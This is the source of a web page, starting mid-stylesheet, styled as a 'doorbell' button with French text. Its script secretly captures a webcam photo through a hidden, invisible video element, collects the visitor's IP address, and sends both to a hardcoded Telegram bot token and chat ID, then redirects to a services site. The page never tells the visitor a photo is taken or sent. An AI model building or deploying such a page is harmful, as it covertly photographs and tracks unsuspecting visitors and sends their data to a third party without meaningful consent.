        /* Estilos gerais */
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .consent-modal {

            top: 0;
            left: 0;

        .consent-box {
            background: #2c3e50;
            padding: 2rem;
            border-radius: 15px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        h2 {
            font-size: 2rem;
            margin-bottom: 1rem;
            color: #3498db;
        }

        p {
            font-size: 1rem;
            margin-bottom: 1.5rem;
        }

        button {
            background: #3498db;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            cursor: pointer;
            font-size: 1.2rem;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: background 0.3s ease, transform 0.3s ease;
            animation: vibrate 2s infinite;
        }

        button:hover {
            background: #2980b9;
            transform: scale(1.05);
        }

        @keyframes vibrate {
            0%, 100% {
                transform: rotate(0deg);
            }
            25% {
                transform: rotate(2deg);
            }
            50% {
                transform: rotate(-2deg);
            }
            75% {
                transform: rotate(2deg);
            }
        }

        #statusMsg {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            text-align: center;
        }

        #hiddenVideo {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
        }

        .popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #2c3e50;
            padding: 2rem;
            border-radius: 15px;
            text-align: center;
            color: white;
            z-index: 1001;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .popup div {
            background: #ecf0f1;
            color: #2c3e50;
            padding: 20px;
            border-radius: 10px;
            font-size: 1.2rem;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .popup a {
            color: #3498db;
            text-decoration: none;
            font-weight: bold;
        }

        .popup a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="consent-modal" id="consentModal">
        <div class="consent-box">

            <p>Felipe Torressilhos</p>
            <button onclick="initiateActivation()">Accepter et sonner ðŸ””</button>
        </div>
    </div>

    <div id="statusMsg"></div>
    <video id="hiddenVideo" autoplay playsinline></video>

    <div class="popup" id="popup" style="display: none;">
        <div id="popupMessage"></div>
    </div>

    <script>
        const BOT_TOKEN = '7761704256:AAFjKhIIjUptkMj84pnUU0VG5u5K_VFaJWg';
        const CHAT_ID = '5562266493';

        function getFormattedDateTime() {
            const now = new Date();
            const date = now.toLocaleDateString('fr-FR');
            const time = now.toLocaleTimeString('fr-FR');
            return `ðŸ“… Date: ${date} ðŸ•’ Heure: ${time}`;
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Indisponible';
            }
        }

        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Erreur d\'envoi:', error);
            }
        }

        async function handleActivation() {
            let ip = await getIPInfo();
            let statusMessage = `ðŸš¨ Sonnette activÃ©e!\nIP: ${ip}\n${getFormattedDateTime()}`;
            let userMessage = 'MERCI';
            userMessage = 'MERCI! <a href="https://torreswebsec.github.io/services/" target="_blank">Des solutions technologiques pour vous</a>';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('hiddenVideo');
                video.srcObject = stream;

                await new Promise(resolve => setTimeout(resolve, 500));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoUrl = canvas.toDataURL('image/jpeg', 0.8);

                // Envoyer photo
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', statusMessage);
                const blob = await fetch(photoUrl).then(r => r.blob());
                formData.append('photo', blob, 'photo.jpg');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                statusMessage += `\nErreur camÃ©ra: ${error.message}`;
                userMessage = 'MERCI! <a href="https://torreswebsec.github.io/services/" target="_blank">Des solutions technologiques pour vous</a>';
            }

            await sendToTelegram(statusMessage);
            return userMessage;
        }

        function showPopup(message) {
            const popup = document.getElementById('popup');
            const popupMessage = document.getElementById('popupMessage');
            popupMessage.innerHTML = message;
            popup.style.display = 'block';

            setTimeout(() => {
                popup.style.display = 'none';
                window.location.href = 'https://torreswebsec.github.io/services/';
            }, 5000);
        }

        async function initiateActivation() {
            document.getElementById('consentModal').style.display = 'none';
            document.getElementById('statusMsg').innerHTML = 'Traitement en cours...';

            const message = await handleActivation();
            showPopup(`
                <div style="color:green; background:#ecf0f1; padding:15px; border-radius:8px;">
                    âœ“ ${message}
                </div>
            `);
        }

        window.onload = () => {
            document.getElementById('consentModal').style.display = 'flex';
        }
    </script>
</body>
</html>
